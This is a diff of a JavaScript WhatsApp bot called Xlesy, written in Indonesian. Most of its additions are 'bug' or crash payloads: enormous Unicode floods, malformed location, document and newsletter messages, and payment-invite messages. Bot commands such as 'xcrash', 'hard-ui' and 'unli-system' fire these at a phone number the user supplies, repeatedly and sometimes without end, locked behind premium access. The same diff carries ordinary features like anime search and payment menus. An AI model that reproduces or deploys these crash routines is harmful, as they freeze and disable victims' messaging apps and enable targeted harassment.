+                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                      mimetype:
+                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                      fileSha256:
+                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                      fileLength: "9999999999999",
+                      pageCount: 1316134911,
+                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
+                      fileEncSha256:
+                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                      directPath:
+                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                      mediaKeyTimestamp: "1724474503",
+                      contactVcard: true,
+                      thumbnailDirectPath:
+                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                      thumbnailSha256:
+                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                      thumbnailEncSha256:
+                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                      jpegThumbnail: "",
+                    },
+                  },
+                },
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+              },
+            }
+          : {}
+      );
+    }
+    
+async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await Xlesy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
+    
+async function func1(target) {
+    await Xlesy.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦹꦹꦹ".repeat(400000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 " }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+async function aipong(target) {
+await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+}
+async function iponcrash(target) {
+await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+sleep(200)
+await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+sleep(200)
+await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+}
+//bug ios
+async function UpiCrash(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "UPI",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function VenCrash(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "VENMO",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function AppXCrash(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "CASHAPP",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function SmCrash(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "SAMSUNGPAY",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+async function newsLetter(target) {
+            try {
+                const messsage = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: `33333333333333333@newsletter`,
+                                newsletterName: "NassCrashV1" + "ી".repeat(120000),
+                                jpegThumbnail: "",
+                                caption: "ꦽ".repeat(120000),
+                                inviteExpiration: Date.now() + 1814400000,
+                            },
+                        },
+                    },
+                };
+                await Xlesy.relayMessage(target, messsage, {
+                    userJid: target,
+                });
+            }
+            catch (err) {
+                console.log(err);
+            }
+        }
+
+    async function SqCrash(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "SQUARE",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function FBiphone(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "FBPAY",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function QXIphone(target) {
+      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
+      await Xlesy.relayMessage(
+        target,
+        {
+          locationMessage: {
+            degreesLatitude: 999.03499999999999,
+            degreesLongitude: -999.03499999999999,
+            name: CrashQAiphone,
+            url: "https://t.me/GxyenDev",
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function QPayIos(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "PAYPAL",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function QPayStriep(target) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          paymentInviteMessage: {
+            serviceType: "STRIPE",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        }
+      );
+    }
+
+    async function QDIphone(target) {
+      Xlesy.relayMessage(
+        target,
+        {
+          extendedTextMessage: {
+            text: "ꦾ".repeat(55000),
+            contextInfo: {
+              stanzaId: target,
+              participant: target,
+              quotedMessage: {
+                conversation: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ࣯࣯".repeat(50000),
+              },
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING",
+              },
+            },
+            inviteLinkGroupTypeV2: "DEFAULT",
+          },
+        },
+        {
+          paymentInviteMessage: {
+            serviceType: "UPI",
+            expiryTimestamp: Date.now() + 5184000000,
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        },
+        {
+          messageId: null,
+        }
+      );
+    }
+        //
+    async function XiosVirus(target) {
+      Xlesy.relayMessage(
+        target,
+        {
+          extendedTextMessage: {
+            text: `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷` + "࣯ꦾ".repeat(90000),
+            contextInfo: {
+              fromMe: false,
+              stanzaId: target,
+              participant: target,
+              quotedMessage: {
+                conversation: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(90000),
+              },
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING",
+              },
+            },
+            inviteLinkGroupTypeV2: "DEFAULT",
+          },
+        },
+        {
+          participant: {
+            jid: target,
+          },
+        },
+        {
+          messageId: null,
+        }
+      );
+    }
+
         async function Carousel(Pe) {
             const msg = generateWAMessageFromContent(
                 Pe, {
@@ -665,12 +2362,10 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
             await Xlesy.relayMessage(Pe, msg.message, {
                 messageId: msg.key.id,
             });
-            console.log("Success! Crl Button Sent")
+              console.log("Success! Crl Button Sent")
         }
         //animecari
-
         const axios = require("axios");
-
         const searchAnime = async (Xlesy, m, query) => {
             try {
                 if (!query) return m.reply("⚠️ Masukkan judul anime atau genre yang ingin dicari!")
@@ -1391,6 +3086,94 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
         //add case
 
         switch (command) {
+case 'xlesybug': {
+if (!q) return m.reply(`Example: .xlesybug 62×××`, { quoted: fkontak1 })
+await Xlesy.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
+let nomor = m.text.split(' ')[1]
+if (!nomor) return
+    let imagePath = './lib/media/image/XlesyBug.jpg';
+        const media = await prepareWAMessageMedia({
+        image: { url: imagePath }
+    }, {
+        upload: Xlesy.waUploadToServer
+    });
+    
+let menunya = `𝘊𝘳𝘦𝘢𝘵𝘰𝘳: 𝘎𝘹𝘺𝘦𝘯𝘯\nYoutube: https://youtube.com/@GxyenDev\n\nʙᴜɢ xʟᴇꜱʏᴠɪᴘ: ᴊɪᴋᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢꜱ ᴀᴛᴀᴜ ᴇʀʀᴏʀ ᴘᴀᴅᴀ xʟᴇꜱʏᴠɪᴘ, ʜᴀʀᴀᴘ ʟᴀᴘᴏʀᴋᴀɴ ᴍᴇʟᴀʟᴜɪ ᴛᴇʟᴇɢʀᴀᴍ/ᴰᵉᵛ ᴜɴᴛᴜᴋ ᴘᴇʀʙᴀɪᴋᴀɴ ᴅᴀɴ ᴘᴇᴍʙᴀʀᴜᴀɴ ʟᴇʙɪʜ ʟᴀɴᴊᴜᴛ.\n\nᴛᴀʀɢᴇᴛ ᴛᴇʟᴀʜ ᴅɪ ᴋᴜɴᴄɪ\nꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴊᴇɴɪꜱ ʙᴜɢxʟᴇꜱʏᴠɪᴘ`
+const buttons = {
+buttonsMessage: {
+contentText: menunya,
+footerText: "© XLESYVIP",
+buttons: [
+{
+buttonId: ".xlesy-hard " + nomor,
+buttonText: { displayText: "🔄 Fitur 3" },
+type: 1, // Type 2 untuk menampilkan sebagai list
+nativeFlowInfo: {
+name: "single_select",
+paramsJson: JSON.stringify({
+title: "SLECT BUG",
+sections: [
+{
+title: "FITUR XLESYVIP BUG",
+rows: [
+{ id: ".trash-fc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ꜰᴄ", description: "trash fc XLESYVIP" },
+{ id: ".xcrash " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴄʀᴀꜱʜ", description: "x crash XLESYVIP" },
+{ id: ".xbug-fc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ xꜰᴄ", description: "xbug fc XLESYVIP" },
+{ id: ".crasher " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴄʀᴀꜱʜ", description: "crasher XLESYVIP" },
+{ id: ".hard-fc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ʜꜰᴄ", description: "hard fc XLESYVIP" },
+{ id: ".uixfc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴜꜰᴄ", description: "ui x fc XLESYVIP" },
+{ id: ".hard-ui " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ʜᴜɪ", description: "hard ui XLESYVIP" },
+{ id: ".xblank " + nomor, title: "xʟᴇꜱʏᴠɪᴘ xʙʟᴀɴᴋ", description: "xblank XLESYVIP" },
+{ id: ".Xlesy-hard " + nomor, title: "xʟᴇꜱʏᴠɪᴘ xʟᴇꜱʏ-ʜᴀʀᴅ", description: "xlesy hard XLESYVIP" },
+{ id: ".blank-1h " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ʙʟᴀɴᴋᴅᴀʏ", description: "blank 1hari XLESYVIP" },
+{ id: ".bugfc-unli " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ꜰᴄ-ᴜɴʟɪ", description: "bug fc unli XLESYVIP" },
+{ id: ".bugui-unli " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴜɪ-ᴜɴʟɪ", description: "bug ui unli XLESYVIP" },
+{ id: ".unli-system " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ꜱʏꜱᴛᴍᴜɴʟɪ", description: "unli system XLESYVIP" }
+]
+},
+{
+title: "FITUR BUG GC",
+rows: [{
+id: ".freeze " + nomor,
+title: "xʟᴇꜱʏᴠɪᴘ ꜰʀᴇᴢᴢ",
+description: "Freeze XLESYVIP "
+}]
+}
+]
+})
+}
+}
+],
+headerType: 4,
+imageMessage: media.imageMessage,
+mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
+            
+},
+};
+
+const generatedMessage = await generateWAMessageFromContent(
+m.chat,
+buttons, { userJid: m.sender, quoted: fkontak1 }
+);
+
+await Xlesy.relayMessage(m.chat, generatedMessage.message, {
+additionalNodes: [{
+tag: "biz",
+attrs: {},
+content: [{
+tag: "interactive",
+attrs: { type: "native_flow", v: "1" },
+content: [{
+tag: "native_flow",
+attrs: { name: "quick_reply" }
+}]
+}]
+}]
+});
+
+} 
+break
+
             case 'gpt': {
                 if (!text) return m.reply(`Example: ${prefix + command} query`, {
                     quoted: fkontak1
@@ -1457,94 +3240,158 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
                 }
             }
             break;
-            //menubug
-            case 'crash-force': {
-                if (!isPremium) return m.reply("only premium access", {
-                    quoted: fkontak1
-                })
-                if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, {
-                    quoted: fkontak1
-                })
-                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                m.reply(`success send bug to ${Pe}`, {
-                    quoted: fkontak1
-                })
-                for (let r = 0; r < 150; r++) {
-                    await DocCursor(Pe)
-                    await MSGSPAM(Pe)
-                    await NativeC(Pe)
-                }
-            }
-            break
-            case 'bugs-force': {
-                if (!isPremium) return m.reply("only premium access", {
-                    quoted: fkontak1
-                })
-                if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, {
-                    quoted: fkontak1
-                })
-                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                m.reply(`success send bug to ${Pe}`, {
-                    quoted: fkontak1
-                })
-                for (let r = 0; r < 150; r++) {
-                    await DocCursor(Pe)
-                    await MSGSPAM(Pe)
-                    await NativeC(Pe)
-                }
-            }
-            break
-            case 'force-ui': {
-                if (!isPremium) return m.reply("only premium access", {
-                    quoted: fkontak1
-                })
-                if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, {
-                    quoted: fkontak1
-                })
-                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                m.reply(`success send bug to ${Pe}`, {
-                    quoted: fkontak1
-                })
-                for (let r = 0; r < 150; r++) {
-                    await DocCursor(Pe)
-                    await MSGSPAM(Pe)
-                    await NativeC(Pe)
-                }
-            }
-            break
-            case 'bug-ios': {
-                if (!isPremium) return m.reply("only premium access", {
-                    quoted: fkontak1
-                })
-                if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, {
-                    quoted: fkontak1
-                })
-                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                m.reply(`success send bug to ${Pe}`, {
-                    quoted: fkontak1
-                })
-                await KillIos(Pe)
-            }
-            break
+            
+            //bug case
+case 'trash-fc':
+case 'xcrash': {
+if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(bugres)
+for (let i = 0; i < 20; i++) {
+await DocBug(target)
+await LocaBugs(target)
+await InvisibleLoadFast(target)
+await InvisiPayload(target)
+await MSGSPAM1(target)
+await DocFc(target)
+await NewIos(target, Ptcp = true)
+await invc2(target, ptcp = true)
+await OverloadCursor(target, ptcp = true)
+}
+m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
+}
+break
 
-            case 'force-spam': {
-                if (!isPremium) return m.reply("only premium access", {
-                    quoted: fkontak1
-                })
-                if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, {
-                    quoted: fkontak1
-                })
-                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                m.reply(`success send bug to ${Pe}`, {
-                    quoted: fkontak1
-                })
-                for (let r = 0; r < 150; r++) {
-                    await DocCursor(Pe)
-                    await MSGSPAM(Pe)
-                    await NativeC(Pe)
-                }
-            }
-            break
+case 'xbug-fc':
+case 'crasher': {
+if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(bugres)
+for (let i = 0; i < 20; i++) {
+await InvisibleLoadFast(target)
+await InvisiPayload(target)
+await MSGSPAM1(target)
+await DocFc(target)
+await NewIos(target, Ptcp = true)
+await invc2(target, ptcp = true)
+await OverloadCursor(target, ptcp = true)
+}
+m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
+}
+break
+
+case 'hard-fc': {
+if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(bugres)
+for (let i = 0; i < 20; i++) {
+await InvisibleLoadFast(target)
+await InvisiPayload(target)
+await MSGSPAM1(target)
+await DocFc(target)
+await NewIos(target, Ptcp = true)
+await invc2(target, ptcp = true)
+await OverloadCursor(target, ptcp = true)
+}
+m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
+}
+break
+
+case 'uixfc': {
+if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(bugres)
+for (let i = 0; i < 20; i++) {
+await DocBug(target)
+await LocaBugs(target)
+await InvisibleLoadFast(target)
+await InvisiPayload(target)
+await MSGSPAM1(target)
+await DocFc(target)
+await NewIos(target, Ptcp = true)
+await invc2(target, ptcp = true)
+await OverloadCursor(target, ptcp = true)
+}
+m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
+}
+break
+
+case 'xlesy-hard':
+case 'hard-ui':
+case 'xblank': 
+case 'blank-1h': {
+if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(bugres)
+for (let i = 0; i < 30; i++) {
+await InvisibleLoadFast(target)
+await InvisiPayload(target)
+await MSGSPAM1(target)
+await DocFc(target)
+await NewIos(target, Ptcp = true)
+await invc2(target, ptcp = true)
+await OverloadCursor(target, ptcp = true)
+await f10(target, Ptcp = true);
+await func1(target)
+await ngeloc(target)
+await killui(target)
+await ngeloc(target)
+await Bug2(target)
+await DocBug(target)
+await LocaBugs(target)
+await crashX(target)
+await aipong(target)
+await iponcrash(target)
+await IosMJ(target, Ptcp = true)
+await crashbeta(target, ptcp = true)
+await crashui2(target, { ptcp: true })
+await BlankScreen(target, { ptcp: true })
+await XeonXRobust(target, { ptcp: true })
+await freezefile(target, { ptcp: true })
+await IosMJ(target, true)
+await LocSystem(target)
+await XiosVirus(target)
+await QDIphone(target)
+await QPayIos(target)
+await QPayStriep(target)
+await FBiphone(target)
+await VenCrash(target)
+await AppXCrash(target)
+await SmCrash(target)
+await SqCrash(target)
+await IosMJ(target, true)
+await XiosVirus(target)
+}
+m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
+}
+break
+
+case 'bugfc-unli':
+case 'bugui-unli':
+case 'unli-system': {
+if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(bugres)
+for (let i = 0; true; i++) {
+await DocBug(target)
+await LocaBugs(target)
+await InvisibleLoadFast(target)
+await InvisiPayload(target)
+await MSGSPAM1(target)
+await DocFc(target)
+await NewIos(target, Ptcp = true)
+await invc2(target, ptcp = true)
+await OverloadCursor(target, ptcp = true)
+}
+m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
+}
+break
             case 'freeze': {
                 if (!isPremium) return m.reply("Features can be accessed by Premium only", {
                     quoted: fkontak1
@@ -1582,6 +3429,8 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
                 await Carousel(groupId);
             }
             break;
+
+
 
             //cerpen
             case 'cerpen-anak': {
@@ -3876,7 +5725,7 @@ break;
 
                 let total = Number(harga); // Harga langsung digunakan tanpa konversi tambahan
 
-                let teks = `*✅ TRANSAKSI DONE BY XlesyGxyenn STORE*\n` +
+                let teks = `*\`✅ Transaksi Done By ${namestore} Store, XLESYVIP\`*\n` +
                     `📦 *Barang:* ${barang}\n` +
                     `💸 *Nominal:* Rp${formatRupiah(total)}\n` +
                     `⏰ *Waktu:* ${new Date().toLocaleString("id-ID")}\n\n` +
@@ -3919,16 +5768,17 @@ break;
                 await Xlesy.sendContact(m.chat, owner, m);
             }
             break
-            case 'profile':
-            case 'cek':
-            case 'me': {
-                const user = Object.keys(db.users)
-                const infoUser = db.users[m.sender]
-                await m.reply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`, {
-                    quoted: fkontak1
-                })
-            }
-            break
+case 'profile':  
+        case 'cek':  
+        case 'me': {  
+            const user = Object.keys(db.users)  
+            const infoUser = db.users[m.sender]  
+            await m.reply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`, {  
+                quoted: fkontak1  
+            })  
+        }  
+        break
+
             case 'leaderboard': {
                 const entries = Object.entries(db.users).sort((a, b) => b[1].uang - a[1].uang).slice(0, 10).map(entry => entry[0]);
                 let teksnya = '╭──┈➤「 *LEADERBOARD* 」❍\n'
@@ -5506,37 +7356,23 @@ break;
                 }
             }
             break
-            case 'pinterest':
-            case 'pint': {
-                if (!isLimit) return m.reply(mess.limit)
-                if (!text) return m.reply(`Example: ${prefix + command} hu tao`, {
-                    quoted: fkontak1
-                })
-                try {
-                    let anu = await pinterest(text)
-                    let result = pickRandom(anu)
-                    if (anu.length < 1) {
-                        m.reply('Post not available!', {
-                            quoted: fkontak1
-                        })
-                    } else {
-                        await m.reply({
-                            image: {
-                                url: result.images_url
-                            },
-                            caption: `*Media Url :* ${result.pin}${result.link ? '\n*Source :* ' + result.link : ''}`
-                        }, {
-                            quoted: fkontak1
-                        })
-                        setLimit(m, db)
-                    }
-                } catch (e) {
-                    m.reply('Pencarian tidak ditemukan!', {
-                        quoted: fkontak1
-                    })
-                }
-            }
-            break
+			case 'pinterest': case 'pint': {
+				if (!isLimit) return m.reply(mess.limit)
+				if (!text) return m.reply(`Example: ${prefix + command} hu tao`, { quoted: fkontak1 })
+				try {
+					let anu = await pinterest(text)
+					let result = pickRandom(anu)
+					if (anu.length < 1) {
+						m.reply('Post not available!', { quoted: fkontak1 })
+					} else {
+						await m.reply({ image: { url: result.images_url }, caption: `*Media Url :* ${result.pin}${result.link ? '\n*Source :* ' + result.link : ''}` }, { quoted: fkontak1 })
+						setLimit(m, db)
+					}
+				} catch (e) {
+					m.reply('Pencarian tidak ditemukan!', { quoted: fkontak1 })
+				}
+			}
+			break
             case 'wallpaper': {
                 if (!isLimit) return m.reply(mess.limit)
                 if (!text) return m.reply(`Example: ${prefix + command} hu tao`, {
@@ -6195,7 +8031,8 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
             }
             break;
 
-            case 'restartbot': {
+            case 'restartbot': 
+            case 'restart': {
                 if (!isCreator) return m.reply("❌ Kamu bukan pemilik bot!")
                 m.reply(`♻️ *Restarting bot...*
     _Tunggu samapai selesai Tidak akan ada Pemberitahuan jikalau selsai jdi Anda ketik .menu/lainya agar muncul menu itu berarti proses restart sudah selesai_`, {
@@ -6285,83 +8122,137 @@ _Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak han
                 })
             }
             break
+            case 'donate':
             case 'pay':
-            case 'payment': {
-                await Xlesy.sendMessage(m.chat, {
-                    react: {
-                        text: '⏳',
-                        key: m.key
-                    }
-                })
-                let imagePath = './lib/media/image/Pay.png' // Gantilah dengan lokasi file yang benar
+case 'payment': {
+  await Xlesy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
+  const url = "https://files.catbox.moe/t6sw8o.jpg";
 
-                let textMessage = `────┈➤ [ _*Xlesy Menu Pembayaran*_ ]─┈➤ 
-╭─┴─┈➤─| *LIST VIA PAY 💳* |───❍ 
-│ ${setv} _VIA DANA_
-│ ${setv} _VIA GOPAY_
-│ ${setv} _VIA OVO_
-│ ${setv} _VIA PULSA_
-│────❍ *NOMOR VIA PAY* ❍───❍
-│ ${setv} _DANA : ${dana}_
-│ ${setv} _GOPAY : ${gopay}_
-│ ${setv} _OVO : ${ovo}_
-│ ${setv} _PULSA : ${pulsa}_ 
-╰─┬───❍ _NOTE_ ❍───❍
-╭─┴─┈➤
-│ ${setv} _JIKALAU SUDAH DI TF!_
-│ _SILAHKAN KIRIM BUKTI TF📷_
-│ _KE ONWER!.._
-│──┈➤ *PERINGATAN*⚠️
-│ ${setv} _JIKALAU TIDAK ADA BUKTI TF_
-│ _INVALID_
-╰───────────❍
+  async function image(url) {
+    const { imageMessage } = await generateWAMessageContent({
+      image: { url }
+    }, {
+      upload: Xlesy.waUploadToServer
+    });
+    return imageMessage;
+  }
 
-`
+  let msg = generateWAMessageFromContent(
+    m.chat,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: `Berikut daftar metode pembayaran saya ya~`
+            },
+            carouselMessage: {
+              cards: [
+                {
+                  header: proto.Message.InteractiveMessage.Header.create({
+                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/dana.jpg' } }, { upload: Xlesy.waUploadToServer })),
+                    title: '',
+                    gifPlayback: true,
+                    subtitle: author,
+                    hasMediaAttachment: false
+                  }),
+                  body: { text: `> Klik tombol DANA di bawah\n> DANA A/N: ${dana}` },
+                  nativeFlowMessage: {
+                    buttons: [
+                      {
+                        "name": "cta_copy",
+                        "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"id\":\"123456789\",\"copy_code\":\"${dana}\"}`
+                      },
+                    ],
+                  },
+                },
+                {
+                  header: proto.Message.InteractiveMessage.Header.create({
+                    ...(await prepareWAMessageMedia({ image: { url: './lib/media/image/gopay.jpg' } }, { upload: Xlesy.waUploadToServer })),
+                    title: '',
+                    gifPlayback: true,
+                    subtitle: author,
+                    hasMediaAttachment: false
+                  }),
+                  body: { text: `> Klik tombol GOPAY di bawah\n> GOPAY A/N: ${gopay}` },
+                  nativeFlowMessage: {
+                    buttons: [
+                      {
+                        "name": "cta_copy",
+                        "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"id\":\"123456789\",\"copy_code\":\"${gopay}\"}`
+                      },
+                    ],
+                  },
+                },
+                {
+                header: proto.Message.InteractiveMessage.Header.create({
